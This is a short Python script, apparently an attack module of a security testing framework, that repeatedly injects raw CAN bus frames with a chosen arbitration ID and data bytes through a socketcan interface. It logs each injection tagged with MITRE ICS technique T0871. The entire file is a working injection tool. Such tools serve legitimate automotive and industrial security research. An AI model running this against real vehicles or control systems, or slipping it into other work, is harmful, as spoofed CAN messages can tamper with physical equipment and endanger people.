#!/usr/bin/env python3
# modules/attacks/can_bus_injector.py

import os
import time
import argparse
import can
import json
from datetime import datetime

LOG_FILE = "results/can_bus_injection_log.json"
MITRE_TTP = "T0871"

def log_injection(can_id, data):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "can_id": hex(can_id),
            "data": data.hex(),
            "ttp": MITRE_TTP
        }) + "\n")

def inject_command(interface, can_id, data, count, delay):
    bus = can.interface.Bus(interface, bustype='socketcan')
    msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)

    for i in range(count):
        try:
            bus.send(msg)
            log_injection(can_id, data)
            print(f"[+] Injected CAN ID {hex(can_id)}: {data.hex()}")
            time.sleep(delay)
        except Exception as e:
            print(f"[!] Injection failed: {e}")
            break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject raw CAN bus messages")
    parser.add_argument("--iface", default="can0", help="CAN interface (default: can0)")
    parser.add_argument("--id", type=lambda x: int(x, 16), required=True, help="CAN ID (hex)")
    parser.add_argument("--data", required=True, help="Data bytes as hex, e.g., '1122334455667788'")
    parser.add_argument("--count", type=int, default=5, help="Number of times to inject")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between injections")
    args = parser.parse_args()

    inject_command(args.iface, args.id, bytes.fromhex(args.data), args.count, args.delay)
